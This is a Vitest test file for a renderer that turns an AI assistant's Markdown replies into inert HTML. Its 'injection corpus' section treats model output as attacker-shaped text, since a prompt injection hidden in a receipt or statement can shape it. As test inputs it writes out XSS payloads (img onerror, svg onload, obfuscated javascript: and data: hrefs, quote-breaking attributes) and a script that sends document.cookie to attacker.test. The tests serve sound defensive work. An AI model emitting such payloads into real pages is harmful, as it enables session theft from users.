import { describe, expect, it } from 'vitest';

import { parseEntityLink, renderAssistantMarkdown } from './markdown';

describe('renderAssistantMarkdown', () => {
	it('renders the Markdown the prompt asks the model for', () => {
		const html = renderAssistantMarkdown('| A | B |\n| --- | --- |\n| 1 | 2 |');
		expect(html).toContain('<table>');
		expect(html).toContain('<td>1</td>');
	});

	it('escapes raw HTML instead of parsing it', () => {
		// The whole safety argument rests on this: with html off there is
		// no HTML to sanitize, so there is no second sanitizer.
		const html = renderAssistantMarkdown('<img src=x onerror="alert(1)"> and **bold**');
		expect(html).not.toContain('<img');
		expect(html).toContain('&lt;img');
		expect(html).toContain('<strong>bold</strong>');
	});

	it('leaves a javascript link as literal text', () => {
		// markdown-it's own link validator refuses javascript:, vbscript:
		// and data: before this module sees them, so the text never becomes
		// a link at all. The scheme survives as words, which is harmless and
		// honest about what the model wrote.
		const html = renderAssistantMarkdown('[click me](javascript:alert(1))');
		expect(html).not.toContain('<a');
		expect(html).not.toContain('<button');
		expect(html).toContain('click me');
	});

	it('renders an external link as text', () => {
		// CHAT-11: a link to a host the model chose is not a link.
		const html = renderAssistantMarkdown('[our docs](https://example.com/x)');
		expect(html).not.toContain('<a');
		expect(html).not.toContain('example.com');
		expect(html).toContain('our docs');
	});

	it('leaves an image as its own text', () => {
		// An image is a request to a host the model chose, whatever the
		// bytes turn out to be.
		const html = renderAssistantMarkdown('![pixel](https://attacker.test/p.png)');
		expect(html).not.toContain('<img');
		expect(html).not.toContain('attacker.test');
	});

	it('renders an entity link as text until a page can open one', () => {
		const html = renderAssistantMarkdown('[Warung Tekko](#txn:clx1)');
		expect(html).not.toContain('<button');
		expect(html).toContain('Warung Tekko');
	});

	it('renders an entity link as a button when the page handles them', () => {
		const html = renderAssistantMarkdown('[Warung Tekko](#txn:clx1)', { entityLinks: true });
		expect(html).toContain('data-entity-scheme="#txn:"');
		expect(html).toContain('data-entity-value="clx1"');
		expect(html).toContain('Warung Tekko</button>');
	});

	it('still refuses a foreign link with entity links on', () => {
		const html = renderAssistantMarkdown('[x](https://example.com)', { entityLinks: true });
		expect(html).not.toContain('<button');
		expect(html).not.toContain('<a');
	});

	it('cannot be made to open an attribute of its own', () => {
		// Two layers: markdown-it percent-encodes the href, and this module
		// escapes what it writes. Either one alone would hold.
		const html = renderAssistantMarkdown('[x](#txn:a"onclick=")', { entityLinks: true });
		expect(html).not.toContain('onclick="');
		expect(html).toContain('data-entity-value="a%22onclick=%22"');
	});
});

/**
 * The injection corpus, this app's share of it (SEC-11, SEC-21, US-037).
 *
 * The corpus row is "a model emitting `<img onerror=…>` in its reply,
 * sanitized before rendering"
 * ([AI safety](../../../docs/security/ai-safety.md#testing)). The model is
 * reachable through a receipt or a statement, so its reply is attacker
 * shaped text and this is the last place before the DOM.
 *
 * Every case asserts the same thing twice over: nothing becomes an
 * element, and the text survives as text. The second half matters, because
 * a sanitizer that silently ate the reply would pass the first half and
 * lose the answer.
 */
describe('the injection corpus: HTML in a model reply', () => {
	/**
	 * The tags the output really has.
	 *
	 * Only the renderer's own, because everything the model wrote had its
	 * `<` escaped on the way through. `&lt;img src=x onerror=…&gt;` is
	 * text, so a regex over the whole string would flag it and prove
	 * nothing; this looks at markup instead.
	 */
	function tagsIn(html: string): string[] {
		return [...html.matchAll(/<([a-zA-Z][^>]*)>/g)].map((match) => match[1]);
	}

	/**
	 * The attribute names on one tag, ignoring anything inside a value.
	 *
	 * A value may legitimately contain a space and an equals sign: an
	 * entity value is the model's text, escaped. What must not appear is a
	 * name the browser would act on.
	 */
	function attributeNames(tag: string): string[] {
		const names: string[] = [];
		let rest = tag.replace(/^[a-zA-Z][\w-]*/, '');

		const ATTRIBUTE = /^\s+([a-zA-Z_:][-\w:.]*)(\s*=\s*("[^"]*"|'[^']*'|[^\s>]*))?/;

		for (let match = ATTRIBUTE.exec(rest); match; match = ATTRIBUTE.exec(rest)) {
			names.push(match[1].toLowerCase());
			rest = rest.slice(match[0].length);
		}

		return names;
	}

	/** No element the browser acts on, and no handler, anywhere in the markup. */
	function assertInert(html: string) {
		for (const tag of tagsIn(html)) {
			expect(tag).not.toMatch(/^(img|script|svg|iframe|object|embed|style|a|link|meta)\b/i);

			for (const name of attributeNames(tag)) {
				expect(name.startsWith('on'), `${name} on <${tag}>`).toBe(false);
				expect(['src', 'href', 'srcdoc', 'formaction']).not.toContain(name);
			}
		}
	}

	it('sanitizes an img with an onerror handler', () => {
		const html = renderAssistantMarkdown('Your total is <img src=x onerror="alert(1)"> rupiah.');

		assertInert(html);
		expect(html).toContain('&lt;img');
		expect(html).toContain('rupiah');
	});

	it('sanitizes a script element', () => {
		const html = renderAssistantMarkdown('<script>fetch("https://attacker.test/"+document.cookie)</script>');

		assertInert(html);
		expect(html).toContain('&lt;script');
	});

	it('sanitizes an event handler on any tag, not just the ones we thought of', () => {
		// The rule is structural: markdown-it runs with `html: false`, so
		// every tag is escaped and no allowlist has to be kept current.
		for (const markup of [
			'<svg onload="alert(1)"></svg>',
			'<body onpageshow="alert(1)">',
			'<details ontoggle="alert(1)" open>',
			'<div onmouseover=alert(1)>hover</div>',
			'<IMG SRC=x ONERROR=alert(1)>',
			'<iframe src="https://attacker.test"></iframe>'
		]) {
			assertInert(renderAssistantMarkdown(markup));
		}
	});

	it('sanitizes a javascript: href, whichever way it is spelled', () => {
		for (const href of [
			'javascript:alert(1)',
			'JaVaScRiPt:alert(1)',
			' javascript:alert(1)',
			'java\tscript:alert(1)',
			'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
		]) {
			const html = renderAssistantMarkdown(`[click me](${href})`, { entityLinks: true });

			assertInert(html);
			expect(html).toContain('click me');
		}
	});

	it('refuses a link destination holding a quote and a space outright', () => {
		// A space ends the destination, so this never becomes a link at
		// all. Worth pinning: it is why the next case has to drop the space
		// to reach the renderer's own escaping.
		const html = renderAssistantMarkdown('[x](#txn:1" onmouseover="alert(1))', {
			entityLinks: true
		});

		assertInert(html);
		expect(html).not.toContain('<button');
	});

	it('writes no handler into the button it does emit', () => {
		// The one element this renderer creates. Its attributes are escaped
		// and an entity value cannot close the quote it sits in, so the
		// handler stays inside the value as text.
		const html = renderAssistantMarkdown('[x](#txn:1"onmouseover="alert(1))', {
			entityLinks: true
		});

		assertInert(html);
		expect(html).toContain('<button type="button"');
		expect(attributeNames(tagsIn(html).find((tag) => tag.startsWith('button')) ?? '')).toEqual([
			'type',
			'data-entity-scheme',
			'data-entity-value'
		]);
	});

	it('does not let an entity link smuggle a scheme past the regex', () => {
		// `#navigate:` is checked again by chat-entities before anything is
		// followed; this is the renderer's half (SEC-11).
		const html = renderAssistantMarkdown('[go](#navigate://attacker.test)', {
			entityLinks: true
		});

		assertInert(html);
		expect(html).toContain('data-entity-scheme="#navigate:"');
		expect(html).toContain('data-entity-value="//attacker.test"');
	});

	it('keeps the reply readable while refusing all of it', () => {
		// A sanitizer that ate the answer would pass every assertion above.
		const html = renderAssistantMarkdown(
			'You spent **87.500** at Warung Tekko.\n\n<img src=x onerror="alert(1)">'
		);

		expect(html).toContain('<strong>87.500</strong>');
		expect(html).toContain('Warung Tekko');
		assertInert(html);
	});
});

describe('parseEntityLink', () => {
	it('reads each scheme the chat knows', () => {
		expect(parseEntityLink('#wallet:w1')).toEqual({ scheme: '#wallet:', value: 'w1' });
		expect(parseEntityLink('#navigate:/settings')).toEqual({
			scheme: '#navigate:',
			value: '/settings'
		});
	});

	it('refuses anything else, including an empty value', () => {
		expect(parseEntityLink('#txn:')).toBeNull();
		expect(parseEntityLink('#unknown:1')).toBeNull();
		expect(parseEntityLink('https://example.com')).toBeNull();
	});
});
